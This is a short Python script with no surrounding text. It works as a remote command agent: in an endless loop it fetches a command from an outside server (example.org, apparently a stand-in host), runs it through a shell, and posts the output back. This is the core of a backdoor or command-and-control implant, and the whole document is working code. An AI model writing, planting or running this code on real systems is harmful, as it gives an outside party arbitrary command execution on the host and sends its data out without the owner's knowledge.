import requests, subprocess, time
while True:
    task = requests.get('https://example.org/task').json()
    command = task.get('command')
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    requests.post('https://example.org/result', json={'stdout': result.stdout, 'stderr': result.stderr})
    time.sleep(10)
